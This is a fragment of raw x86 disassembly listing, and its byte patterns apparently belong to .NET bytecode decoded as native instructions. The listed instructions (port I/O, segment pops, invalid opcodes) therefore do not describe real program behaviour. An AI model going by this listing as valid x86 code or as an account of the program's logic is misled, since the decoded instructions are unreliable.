  403a70:	0a 8c 5d 00 00 01 28 	or     0x28010000(%ebp,%ebx,2),%cl
  403a77:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a78:	00 00                	add    %al,(%eax)
  403a7a:	0a 28                	or     (%eax),%ch
  403a7c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a7d:	00 00                	add    %al,(%eax)
  403a7f:	0a 6f 30             	or     0x30(%edi),%ch
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0a 2b                	or     (%ebx),%ch
  403a86:	1b 02                	sbb    (%edx),%eax
  403a88:	7b 2e                	jnp    0x403ab8
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	04 06                	add    $0x6,%al
  403a8e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a8f:	83 00 00             	addl   $0x0,(%eax)
  403a92:	0a 7b 32             	or     0x32(%ebx),%bh
  403a95:	00 00                	add    %al,(%eax)
  403a97:	04 72                	add    $0x72,%al
  403a99:	01 00                	add    %eax,(%eax)
  403a9b:	00 70 6f             	add    %dh,0x6f(%eax)
  403a9e:	30 00                	xor    %al,(%eax)
  403aa0:	00 0a                	add    %cl,(%edx)
  403aa2:	03 6f a7             	add    -0x59(%edi),%ebp
  403aa5:	00 00                	add    %al,(%eax)
  403aa7:	0a 28                	or     (%eax),%ch
  403aa9:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403aae:	1e                   	push   %ds
  403aaf:	02 7b 2e             	add    0x2e(%ebx),%bh
  403ab2:	00 00                	add    %al,(%eax)
  403ab4:	04 06                	add    $0x6,%al
  403ab6:	6f                   	outsl  %ds:(%esi),(%dx)
  403ab7:	83 00 00             	addl   $0x0,(%eax)
  403aba:	0a 7b 33             	or     0x33(%ebx),%bh
  403abd:	00 00                	add    %al,(%eax)
  403abf:	04 03                	add    $0x3,%al
  403ac1:	6f                   	outsl  %ds:(%esi),(%dx)
  403ac2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403ac3:	00 00                	add    %al,(%eax)
  403ac5:	0a 6f 30             	or     0x30(%edi),%ch
  403ac8:	00 00                	add    %al,(%eax)
  403aca:	0a 2b                	or     (%ebx),%ch
  403acc:	1b 02                	sbb    (%edx),%eax
  403ace:	7b 2e                	jnp    0x403afe
  403ad0:	00 00                	add    %al,(%eax)
  403ad2:	04 06                	add    $0x6,%al
  403ad4:	6f                   	outsl  %ds:(%esi),(%dx)
  403ad5:	83 00 00             	addl   $0x0,(%eax)
  403ad8:	0a 7b 33             	or     0x33(%ebx),%bh
  403adb:	00 00                	add    %al,(%eax)
  403add:	04 72                	add    $0x72,%al
  403adf:	01 00                	add    %eax,(%eax)
  403ae1:	00 70 6f             	add    %dh,0x6f(%eax)
  403ae4:	30 00                	xor    %al,(%eax)
  403ae6:	00 0a                	add    %cl,(%edx)
  403ae8:	28 a8 00 00 0a 2a    	sub    %ch,0x2a0a0000(%eax)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	13 30                	adc    (%eax),%esi
  403af2:	02 00                	add    (%eax),%al
  403af4:	1a 00                	sbb    (%eax),%al
  403af6:	00 00                	add    %al,(%eax)
  403af8:	0b 00                	or     (%eax),%eax
  403afa:	00 11                	add    %dl,(%ecx)
  403afc:	1f                   	pop    %ds
  403afd:	f6 28                	imulb  (%eax)
  403aff:	34 00                	xor    $0x0,%al
  403b01:	00 06                	add    %al,(%esi)
  403b03:	0a 06                	or     (%esi),%al
  403b05:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b0b:	07                   	pop    %es
  403b0c:	18 2e                	sbb    %ch,(%esi)
  403b0e:	03 07                	add    (%edi),%eax
  403b10:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b15:	2a 00                	sub    (%eax),%al
  403b17:	00 13                	add    %dl,(%ebx)
  403b19:	30 02                	xor    %al,(%edx)
  403b1b:	00 1a                	add    %bl,(%edx)
  403b1d:	00 00                	add    %al,(%eax)
  403b1f:	00 0b                	add    %cl,(%ebx)
  403b21:	00 00                	add    %al,(%eax)
  403b23:	11 1f                	adc    %ebx,(%edi)
  403b25:	f5                   	cmc
  403b26:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403b29:	00 06                	add    %al,(%esi)
  403b2b:	0a 06                	or     (%esi),%al
  403b2d:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b33:	07                   	pop    %es
  403b34:	18 2e                	sbb    %ch,(%esi)
  403b36:	03 07                	add    (%edi),%eax
  403b38:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b3d:	2a 00                	sub    (%eax),%al
  403b3f:	00 13                	add    %dl,(%ebx)
  403b41:	30 02                	xor    %al,(%edx)
  403b43:	00 1a                	add    %bl,(%edx)
  403b45:	00 00                	add    %al,(%eax)
  403b47:	00 0b                	add    %cl,(%ebx)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	11 1f                	adc    %ebx,(%edi)
  403b4d:	f4                   	hlt
  403b4e:	28 34 00             	sub    %dh,(%eax,%eax,1)
  403b51:	00 06                	add    %al,(%esi)
  403b53:	0a 06                	or     (%esi),%al
  403b55:	28 35 00 00 06 0b    	sub    %dh,0xb060000
  403b5b:	07                   	pop    %es
  403b5c:	18 2e                	sbb    %ch,(%esi)
  403b5e:	03 07                	add    (%edi),%eax
  403b60:	2d 02 16 2a 17       	sub    $0x172a1602,%eax
  403b65:	2a 1e                	sub    (%esi),%bl
  403b67:	02 28                	add    (%eax),%ch
  403b69:	11 00                	adc    %eax,(%eax)
  403b6b:	00 0a                	add    %cl,(%edx)
  403b6d:	2a 00                	sub    (%eax),%al
  403b6f:	00 03                	add    %al,(%ebx)
  403b71:	30 02                	xor    %al,(%edx)
  403b73:	00 40 00             	add    %al,0x0(%eax)
  403b76:	00 00                	add    %al,(%eax)
  403b78:	00 00                	add    %al,(%eax)
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	02 1f                	add    (%edi),%bl
  403b7e:	0c 7d                	or     $0x7d,%al
  403b80:	42                   	inc    %edx
  403b81:	00 00                	add    %al,(%eax)
  403b83:	04 02                	add    $0x2,%al
  403b85:	1f                   	pop    %ds
  403b86:	0e                   	push   %cs
  403b87:	7d 44                	jge    0x403bcd
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	04 02                	add    $0x2,%al
  403b8d:	1f                   	pop    %ds
  403b8e:	0e                   	push   %cs
  403b8f:	7d 46                	jge    0x403bd7
  403b91:	00 00                	add    %al,(%eax)
  403b93:	04 02                	add    $0x2,%al
  403b95:	1f                   	pop    %ds
  403b96:	0e                   	push   %cs
  403b97:	7d 48                	jge    0x403be1
  403b99:	00 00                	add    %al,(%eax)
  403b9b:	04 02                	add    $0x2,%al
  403b9d:	19 7d 4a             	sbb    %edi,0x4a(%ebp)
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	04 02                	add    $0x2,%al
  403ba4:	19 7d 4b             	sbb    %edi,0x4b(%ebp)
  403ba7:	00 00                	add    %al,(%eax)
  403ba9:	04 02                	add    $0x2,%al
  403bab:	28 a9 00 00 0a 02    	sub    %ch,0x20a0000(%ecx)
  403bb1:	73 1e                	jae    0x403bd1
  403bb3:	00 00                	add    %al,(%eax)
  403bb5:	06                   	push   %es
  403bb6:	7d 41                	jge    0x403bf9
  403bb8:	00 00                	add    %al,(%eax)
  403bba:	04 2a                	add    $0x2a,%al
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	08 00                	or     %al,(%eax)
  403bc0:	44                   	inc    %esp
  403bc1:	03 00                	add    (%eax),%eax
  403bc3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403bc6:	00 11                	add    %dl,(%ecx)
  403bc8:	03 28                	add    (%eax),%ebp
  403bca:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  403bcf:	08 04 28             	or     %al,(%eax,%ebp,1)
  403bd2:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403bd7:	2d 28 27 00 00       	sub    $0x2728,%eax
  403bdc:	0a 6f 28             	or     0x28(%edi),%ch
  403bdf:	00 00                	add    %al,(%eax)
  403be1:	0a 0a                	or     (%edx),%cl
  403be3:	72 01                	jb     0x403be6
  403be5:	00 00                	add    %al,(%eax)
  403be7:	70 0b                	jo     0x403bf4
  403be9:	03 28                	add    (%eax),%ebp
  403beb:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403bf0:	02 03                	add    (%ebx),%al
  403bf2:	0a 04 28             	or     (%eax,%ebp,1),%al
  403bf5:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403bfa:	02 04 0b             	add    (%ebx,%ecx,1),%al
  403bfd:	07                   	pop    %es
  403bfe:	06                   	push   %es
  403bff:	28 aa 00 00 0a 26    	sub    %ch,0x260a0000(%edx)
  403c05:	02 72 01             	add    0x1(%edx),%dh
  403c08:	00 00                	add    %al,(%eax)
  403c0a:	70 7d                	jo     0x403c89
  403c0c:	4c                   	dec    %esp
  403c0d:	00 00                	add    %al,(%eax)
  403c0f:	04 02                	add    $0x2,%al
  403c11:	72 01                	jb     0x403c14
  403c13:	00 00                	add    %al,(%eax)
  403c15:	70 7d                	jo     0x403c94
  403c17:	4d                   	dec    %ebp
  403c18:	00 00                	add    %al,(%eax)
  403c1a:	04 73                	add    $0x73,%al
  403c1c:	ab                   	stos   %eax,%es:(%edi)
  403c1d:	00 00                	add    %al,(%eax)
  403c1f:	0a 0c 05 6f ac 00 00 	or     0xac6f(,%eax,1),%cl
  403c26:	0a 13                	or     (%ebx),%dl
  403c28:	13 38                	adc    (%eax),%edi
  403c2a:	ac                   	lods   %ds:(%esi),%al
  403c2b:	02 00                	add    (%eax),%al
  403c2d:	00 11                	add    %dl,(%ecx)
  403c2f:	13 6f ad             	adc    -0x53(%edi),%ebp
  403c32:	00 00                	add    %al,(%eax)
  403c34:	0a 0d 14 13 04 09    	or     0x9041314,%cl
  403c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403c3b:	ae                   	scas   %es:(%edi),%al
  403c3c:	00 00                	add    %al,(%eax)
  403c3e:	0a 28                	or     (%eax),%ch
  403c40:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  403c45:	0e                   	push   %cs
  403c46:	d0 33                	shlb   $1,(%ebx)
  403c48:	00 00                	add    %al,(%eax)
  403c4a:	01 28                	add    %ebp,(%eax)
  403c4c:	af                   	scas   %es:(%edi),%eax
  403c4d:	00 00                	add    %al,(%eax)
  403c4f:	0a 13                	or     (%ebx),%dl
  403c51:	04 2b                	add    $0x2b,%al
  403c53:	0d 09 6f ae 00       	or     $0xae6f09,%eax
  403c58:	00 0a                	add    %cl,(%edx)
  403c5a:	28 b0 00 00 0a 13    	sub    %dh,0x130a0000(%eax)
  403c60:	04 11                	add    $0x11,%al
  403c62:	04 6f                	add    $0x6f,%al
  403c64:	b1 00                	mov    $0x0,%cl
  403c66:	00 0a                	add    %cl,(%edx)
  403c68:	39 1c 01             	cmp    %ebx,(%ecx,%eax,1)
  403c6b:	00 00                	add    %al,(%eax)
  403c6d:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  403c70:	b2 00                	mov    $0x0,%dl
  403c72:	00 0a                	add    %cl,(%edx)
  403c74:	13 05 72 53 01 00    	adc    0x15372,%eax
  403c7a:	70 1f                	jo     0x403c9b
  403c7c:	60                   	pusha
  403c7d:	13 14 12             	adc    (%edx,%edx,1),%edx
  403c80:	14 28                	adc    $0x28,%al
  403c82:	b3 00                	mov    $0x0,%bl
  403c84:	00 0a                	add    %cl,(%edx)
  403c86:	72 93                	jb     0x403c1b
  403c88:	01 00                	add    %eax,(%eax)
  403c8a:	70 28                	jo     0x403cb4
  403c8c:	b4 00                	mov    $0x0,%ah
  403c8e:	00 0a                	add    %cl,(%edx)
  403c90:	28 b0 00 00 0a 13    	sub    %dh,0x130a0000(%eax)
  403c96:	06                   	push   %es
  403c97:	11 06                	adc    %eax,(%esi)
  403c99:	17                   	pop    %ss
  403c9a:	8d 60 00             	lea    0x0(%eax),%esp
  403c9d:	00 01                	add    %al,(%ecx)
  403c9f:	13 15 11 15 16 11    	adc    0x11161511,%edx
  403ca5:	05 a2 11 15 6f       	add    $0x6f1511a2,%eax
  403caa:	b5 00                	mov    $0x0,%ch
  403cac:	00 0a                	add    %cl,(%edx)
  403cae:	13 06                	adc    (%esi),%eax
  403cb0:	11 06                	adc    %eax,(%esi)
  403cb2:	20 14 02             	and    %dl,(%edx,%eax,1)
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	14 7e                	adc    $0x7e,%al
  403cb9:	b6 00                	mov    $0x0,%dh
  403cbb:	00 0a                	add    %cl,(%edx)
  403cbd:	14 6f                	adc    $0x6f,%al
  403cbf:	b7 00                	mov    $0x0,%bh
  403cc1:	00 0a                	add    %cl,(%edx)
  403cc3:	13 07                	adc    (%edi),%eax
  403cc5:	11 07                	adc    %eax,(%edi)
  403cc7:	14 6f                	adc    $0x6f,%al
  403cc9:	b8 00 00 0a 13       	mov    $0x130a0000,%eax
  403cce:	08 16                	or     %dl,(%esi)
  403cd0:	13 09                	adc    (%ecx),%ecx
  403cd2:	72 01                	jb     0x403cd5
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	70 13                	jo     0x403ceb
  403cd8:	0a 09                	or     (%ecx),%cl
  403cda:	6f                   	outsl  %ds:(%esi),(%dx)
  403cdb:	b9 00 00 0a 28       	mov    $0x280a0000,%ecx
  403ce0:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403ce5:	1d 02 72 97 01       	sbb    $0x1977202,%eax
  403cea:	00 70 09             	add    %dh,0x9(%eax)
  403ced:	6f                   	outsl  %ds:(%esi),(%dx)
  403cee:	b9 00 00 0a 11       	mov    $0x110a0000,%ecx
  403cf3:	09 8c 5d 00 00 01 28 	or     %ecx,0x28010000(%ebp,%ebx,2)
  403cfa:	ba 00 00 0a 7d       	mov    $0x7d0a0000,%edx
  403cff:	4d                   	dec    %ebp
  403d00:	00 00                	add    %al,(%eax)
  403d02:	04 02                	add    $0x2,%al
  403d04:	6f                   	outsl  %ds:(%esi),(%dx)
  403d05:	bb 00 00 0a 13       	mov    $0x130a0000,%ebx
  403d0a:	0a 11                	or     (%ecx),%dl
  403d0c:	0a 28                	or     (%eax),%ch
  403d0e:	0d 00 00 0a 2c       	or     $0x2c0a0000,%eax
  403d13:	02 de                	add    %dh,%bl
  403d15:	3f                   	aas
  403d16:	11 0a                	adc    %ecx,(%edx)
  403d18:	11 05 28 bc 00 00    	adc    %eax,0xbc28
  403d1e:	0a 13                	or     (%ebx),%dl
  403d20:	0b 11                	or     (%ecx),%edx
  403d22:	06                   	push   %es
  403d23:	72 ad                	jb     0x403cd2
  403d25:	01 00                	add    %eax,(%eax)
  403d27:	70 20                	jo     0x403d49
  403d29:	14 01                	adc    $0x1,%al
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	14 11                	adc    $0x11,%al
  403d2f:	08 17                	or     %dl,(%edi)
  403d31:	8d 01                	lea    (%ecx),%eax
  403d33:	00 00                	add    %al,(%eax)
  403d35:	01 13                	add    %edx,(%ebx)
  403d37:	16                   	push   %ss
  403d38:	11 16                	adc    %edx,(%esi)
  403d3a:	16                   	push   %ss
  403d3b:	11 0b                	adc    %ecx,(%ebx)
  403d3d:	a2 11 16 6f bd       	mov    %al,0xbd6f1611
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 26                	or     (%esi),%ah
  403d46:	de 05 13 0c 11 0c    	fiadds 0xc110c13
  403d4c:	7a 11                	jp     0x403d5f
  403d4e:	09 17                	or     %edx,(%edi)
  403d50:	58                   	pop    %eax
  403d51:	13 09                	adc    (%ecx),%ecx
  403d53:	2b 84 11 06 72 b5 01 	sub    0x1b57206(%ecx,%edx,1),%eax
  403d5a:	00 70 20             	add    %dh,0x20(%eax)
  403d5d:	14 01                	adc    $0x1,%al
  403d5f:	00 00                	add    %al,(%eax)
  403d61:	14 11                	adc    $0x11,%al
  403d63:	08 14 6f             	or     %dl,(%edi,%ebp,2)
  403d66:	bd 00 00 0a 74       	mov    $0x740a0000,%ebp
  403d6b:	68 00 00 01 13       	push   $0x13010000
  403d70:	0d 08 09 6f b9       	or     $0xb96f0908,%eax
  403d75:	00 00                	add    %al,(%eax)
  403d77:	0a 11                	or     (%ecx),%dl
  403d79:	0d 73 be 00 00       	or     $0xbe73,%eax
  403d7e:	0a 6f bf             	or     -0x41(%edi),%ch
  403d81:	00 00                	add    %al,(%eax)
  403d83:	0a 38                	or     (%eax),%bh
  403d85:	51                   	push   %ecx
  403d86:	01 00                	add    %eax,(%eax)
  403d88:	00 14 13             	add    %dl,(%ebx,%edx,1)
  403d8b:	0e                   	push   %cs
  403d8c:	14 13                	adc    $0x13,%al
  403d8e:	0f 11 04 d0          	movups %xmm0,(%eax,%edx,8)
  403d92:	22 00                	and    (%eax),%al
  403d94:	00 01                	add    %al,(%ecx)
  403d96:	28 af 00 00 0a 28    	sub    %ch,0x280a0000(%edi)
  403d9c:	c0 00 00             	rolb   $0x0,(%eax)
  403d9f:	0a 39                	or     (%ecx),%bh
  403da1:	e9 00 00 00 11       	jmp    0x11403da6
  403da6:	04 d0                	add    $0xd0,%al
  403da8:	21 00                	and    %eax,(%eax)
  403daa:	00 01                	add    %al,(%ecx)
  403dac:	28 af 00 00 0a 28    	sub    %ch,0x280a0000(%edi)
  403db2:	c0 00 00             	rolb   $0x0,(%eax)
  403db5:	0a 39                	or     (%ecx),%bh
  403db7:	b1 00                	mov    $0x0,%cl
  403db9:	00 00                	add    %al,(%eax)
  403dbb:	09 6f b9             	or     %ebp,-0x47(%edi)
  403dbe:	00 00                	add    %al,(%eax)
  403dc0:	0a 28                	or     (%eax),%ch
  403dc2:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403dc7:	16                   	push   %ss
  403dc8:	02 72 c5             	add    -0x3b(%edx),%dh
  403dcb:	01 00                	add    %eax,(%eax)
  403dcd:	70 09                	jo     0x403dd8
  403dcf:	6f                   	outsl  %ds:(%esi),(%dx)
  403dd0:	b9 00 00 0a 28       	mov    $0x280a0000,%ecx
  403dd5:	c1 00 00             	roll   $0x0,(%eax)
  403dd8:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403ddb:	00 00                	add    %al,(%eax)
  403ddd:	04 09                	add    $0x9,%al
  403ddf:	6f                   	outsl  %ds:(%esi),(%dx)
  403de0:	c2 00 00             	ret    $0x0
  403de3:	0a 28                	or     (%eax),%ch
  403de5:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403dea:	16                   	push   %ss
  403deb:	02 25 7b 4d 00 00    	add    0x4d7b,%ah
  403df1:	04 72                	add    $0x72,%al
  403df3:	d1 01                	roll   $1,(%ecx)
  403df5:	00 70 28             	add    %dh,0x28(%eax)
  403df8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403df9:	00 00                	add    %al,(%eax)
  403dfb:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	04 02                	add    $0x2,%al
  403e02:	6f                   	outsl  %ds:(%esi),(%dx)
  403e03:	bb 00 00 0a 13       	mov    $0x130a0000,%ebx
  403e08:	0f 11 0f             	movups %xmm1,(%edi)
  403e0b:	72 fb                	jb     0x403e08
  403e0d:	01 00                	add    %eax,(%eax)
  403e0f:	70 28                	jo     0x403e39
  403e11:	c3                   	ret
  403e12:	00 00                	add    %al,(%eax)
  403e14:	0a 2c 0e             	or     (%esi,%ecx,1),%ch
  403e17:	02 09                	add    (%ecx),%cl
  403e19:	6f                   	outsl  %ds:(%esi),(%dx)
  403e1a:	c2 00 00             	ret    $0x0
  403e1d:	0a 6f c4             	or     -0x3c(%edi),%ch
  403e20:	00 00                	add    %al,(%eax)
  403e22:	0a 2b                	or     (%ebx),%ch
  403e24:	37                   	aaa
  403e25:	11 0f                	adc    %ecx,(%edi)
  403e27:	28 0d 00 00 0a 2c    	sub    %cl,0x2c0a0000
  403e2d:	08 09                	or     %cl,(%ecx)
  403e2f:	6f                   	outsl  %ds:(%esi),(%dx)
  403e30:	c5 00                	lds    (%eax),%eax
  403e32:	00 0a                	add    %cl,(%edx)
  403e34:	13 0e                	adc    (%esi),%ecx
  403e36:	11 0e                	adc    %ecx,(%esi)
  403e38:	2d 22 11 0f 11       	sub    $0x110f1122,%eax
  403e3d:	04 28                	add    $0x28,%al
  403e3f:	bc 00 00 0a 13       	mov    $0x130a0000,%esp
  403e44:	0e                   	push   %cs
  403e45:	de 15 26 02 72 01    	ficoms 0x1720226
  403e4b:	02 00                	add    (%eax),%al
  403e4d:	70 6f                	jo     0x403ebe
  403e4f:	c6 00 00             	movb   $0x0,(%eax)
  403e52:	0a 72 fb             	or     -0x5(%edx),%dh
  403e55:	01 00                	add    %eax,(%eax)
  403e57:	70 13                	jo     0x403e6c
  403e59:	0f de 00             	pmaxub (%eax),%mm0
  403e5c:	11 0f                	adc    %ecx,(%edi)
  403e5e:	72 fb                	jb     0x403e5b
  403e60:	01 00                	add    %eax,(%eax)
  403e62:	70 28                	jo     0x403e8c
  403e64:	c3                   	ret
  403e65:	00 00                	add    %al,(%eax)
  403e67:	0a 2d 97 2b 54 02    	or     0x2542b97,%ch
  403e6d:	72 01                	jb     0x403e70
  403e6f:	00 00                	add    %al,(%eax)
  403e71:	70 72                	jo     0x403ee5
  403e73:	01 00                	add    %eax,(%eax)
  403e75:	00 70 72             	add    %dh,0x72(%eax)
  403e78:	01 00                	add    %eax,(%eax)
  403e7a:	00 70 72             	add    %dh,0x72(%eax)
  403e7d:	01 00                	add    %eax,(%eax)
  403e7f:	00 70 6f             	add    %dh,0x6f(%eax)
  403e82:	c7 00 00 0a 13 10    	movl   $0x10130a00,(%eax)
  403e88:	11 10                	adc    %edx,(%eax)
  403e8a:	13 0e                	adc    (%esi),%ecx
  403e8c:	2b 32                	sub    (%edx),%esi
  403e8e:	09 6f b9             	or     %ebp,-0x47(%edi)
  403e91:	00 00                	add    %al,(%eax)
  403e93:	0a 28                	or     (%eax),%ch
  403e95:	0d 00 00 0a 2d       	or     $0x2d0a0000,%eax
  403e9a:	16                   	push   %ss
  403e9b:	02 72 c5             	add    -0x3b(%edx),%dh
  403e9e:	01 00                	add    %eax,(%eax)
  403ea0:	70 09                	jo     0x403eab
  403ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea3:	b9 00 00 0a 28       	mov    $0x280a0000,%ecx
  403ea8:	c1 00 00             	roll   $0x0,(%eax)
  403eab:	0a 7d 4d             	or     0x4d(%ebp),%bh
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	04 14                	add    $0x14,%al
  403eb2:	13 11                	adc    (%ecx),%edx
  403eb4:	02 6f c8             	add    -0x38(%edi),%ch
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	0a 13                	or     (%ebx),%dl
  403ebb:	11 11                	adc    %edx,(%ecx)
  403ebd:	11 13                	adc    %edx,(%ebx)
  403ebf:	0e                   	push   %cs
  403ec0:	08 09                	or     %cl,(%ecx)
  403ec2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec3:	b9 00 00 0a 11       	mov    $0x110a0000,%ecx
  403ec8:	0e                   	push   %cs
  403ec9:	73 be                	jae    0x403e89
  403ecb:	00 00                	add    %al,(%eax)
  403ecd:	0a 6f bf             	or     -0x41(%edi),%ch
  403ed0:	00 00                	add    %al,(%eax)
  403ed2:	0a de                	or     %dh,%bl
  403ed4:	05 13 12 11 12       	add    $0x12111213,%eax
  403ed9:	7a 11                	jp     0x403eec
  403edb:	13 6f 5d             	adc    0x5d(%edi),%ebp
  403ede:	00 00                	add    %al,(%eax)
  403ee0:	0a 3a                	or     (%edx),%bh
  403ee2:	48                   	dec    %eax
  403ee3:	fd                   	std
  403ee4:	ff                   	(bad)
  403ee5:	ff                   	lcall  (bad)
  403ee6:	de 0c 11             	fimuls (%ecx,%edx,1)
  403ee9:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  403eec:	11 13                	adc    %edx,(%ebx)
  403eee:	6f                   	outsl  %ds:(%esi),(%dx)
  403eef:	5e                   	pop    %esi
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	0a dc                	or     %ah,%bl
  403ef4:	02 72 01             	add    0x1(%edx),%dh
  403ef7:	00 00                	add    %al,(%eax)
  403ef9:	70 7d                	jo     0x403f78
  403efb:	4c                   	dec    %esp
  403efc:	00 00                	add    %al,(%eax)
  403efe:	04 02                	add    $0x2,%al
  403f00:	72 01                	jb     0x403f03
  403f02:	00 00                	add    %al,(%eax)
  403f04:	70 7d                	jo     0x403f83
  403f06:	4d                   	dec    %ebp
  403f07:	00 00                	add    %al,(%eax)
  403f09:	04 08                	add    $0x8,%al
  403f0b:	2a 41 64             	sub    0x64(%ecx),%al
  403f0e:	00 00                	add    %al,(%eax)
  403f10:	00 00                	add    %al,(%eax)
  403f12:	00 00                	add    %al,(%eax)
  403f14:	11 01                	adc    %eax,(%ecx)
  403f16:	00 00                	add    %al,(%eax)
  403f18:	6f                   	outsl  %ds:(%esi),(%dx)
  403f19:	00 00                	add    %al,(%eax)
  403f1b:	00 80 01 00 00 05    	add    %al,0x5000001(%eax)
  403f21:	00 00                	add    %al,(%eax)
  403f23:	00 69 00             	add    %ch,0x0(%ecx)
  403f26:	00 01                	add    %al,(%ecx)
  403f28:	00 00                	add    %al,(%eax)
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	72 02                	jb     0x403f30
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	0d 00 00 00 7f       	or     $0x7f000000,%eax
  403f35:	02 00                	add    (%eax),%al
  403f37:	00 15 00 00 00 01    	add    %dl,0x1000000
  403f3d:	00 00                	add    %al,(%eax)
  403f3f:	01 00                	add    %eax,(%eax)
  403f41:	00 00                	add    %al,(%eax)
  403f43:	00 c7                	add    %al,%bh
  403f45:	01 00                	add    %eax,(%eax)
  403f47:	00 46 01             	add    %al,0x1(%esi)
  403f4a:	00 00                	add    %al,(%eax)
  403f4c:	0d 03 00 00 05       	or     $0x5000003,%eax
  403f51:	00 00                	add    %al,(%eax)
  403f53:	00 69 00             	add    %ch,0x0(%ecx)
  403f56:	00 01                	add    %al,(%ecx)
  403f58:	02 00                	add    (%eax),%al
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	61                   	popa
  403f5d:	00 00                	add    %al,(%eax)
  403f5f:	00 bf 02 00 00 20    	add    %bh,0x20000002(%edi)
  403f65:	03 00                	add    (%eax),%eax
  403f67:	00 0c 00             	add    %cl,(%eax,%eax,1)
  403f6a:	00 00                	add    %al,(%eax)
  403f6c:	00 00                	add    %al,(%eax)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	13 30                	adc    (%eax),%esi
  403f72:	04 00                	add    $0x0,%al
  403f74:	14 00                	adc    $0x0,%al
  403f76:	00 00                	add    %al,(%eax)
  403f78:	0d 00 00 11 05       	or     $0x5110000,%eax
  403f7d:	0e                   	push   %cs
  403f7e:	04 03                	add    $0x3,%al
  403f80:	04 28                	add    $0x28,%al
  403f82:	23 00                	and    (%eax),%eax
  403f84:	00 06                	add    %al,(%esi)
  403f86:	0a 06                	or     (%esi),%al
  403f88:	15 33 03 0e 04       	adc    $0x40e0333,%eax
  403f8d:	0a 06                	or     (%esi),%al
  403f8f:	2a 13                	sub    (%ebx),%dl
  403f91:	30 06                	xor    %al,(%esi)
  403f93:	00 51 00             	add    %dl,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	0e                   	push   %cs
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	11 03                	adc    %eax,(%ebx)
  403f9d:	04 0e                	add    $0xe,%al
  403f9f:	04 05                	add    $0x5,%al
  403fa1:	0e                   	push   %cs
  403fa2:	05 0e 06 28 02       	add    $0x228060e,%eax
  403fa7:	00 00                	add    %al,(%eax)
  403fa9:	06                   	push   %es
  403faa:	0a 06                	or     (%esi),%al
  403fac:	2c 3d                	sub    $0x3d,%al
  403fae:	73 c9                	jae    0x403f79
  403fb0:	00 00                	add    %al,(%eax)
  403fb2:	0a 0b                	or     (%ebx),%cl
  403fb4:	06                   	push   %es
  403fb5:	7b 22                	jnp    0x403fd9
  403fb7:	00 00                	add    %al,(%eax)
  403fb9:	04 6f                	add    $0x6f,%al
  403fbb:	ca 00 00             	lret   $0x0
  403fbe:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  403fc4:	12 09                	adc    (%ecx),%cl
  403fc6:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  403fc9:	0c 07                	or     $0x7,%al
  403fcb:	08 6f cb             	or     %ch,-0x35(%edi)
  403fce:	00 00                	add    %al,(%eax)
  403fd0:	0a 11                	or     (%ecx),%dl
  403fd2:	04 17                	add    $0x17,%al
  403fd4:	58                   	pop    %eax
  403fd5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403fd8:	04 09                	add    $0x9,%al
  403fda:	8e 69 32             	mov    0x32(%ecx),%gs
  403fdd:	e7 06                	out    %eax,$0x6
  403fdf:	7b 21                	jnp    0x404002
  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	04 07                	add    $0x7,%al
  403fe5:	73 cc                	jae    0x403fb3
  403fe7:	00 00                	add    %al,(%eax)
  403fe9:	0a 2a                	or     (%edx),%ch
  403feb:	14 2a                	adc    $0x2a,%al
  403fed:	00 00                	add    %al,(%eax)
  403fef:	00 13                	add    %dl,(%ebx)
  403ff1:	30 06                	xor    %al,(%esi)
  403ff3:	00 4f 00             	add    %cl,0x0(%edi)
  403ff6:	00 00                	add    %al,(%eax)
  403ff8:	0e                   	push   %cs
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	11 03                	adc    %eax,(%ebx)
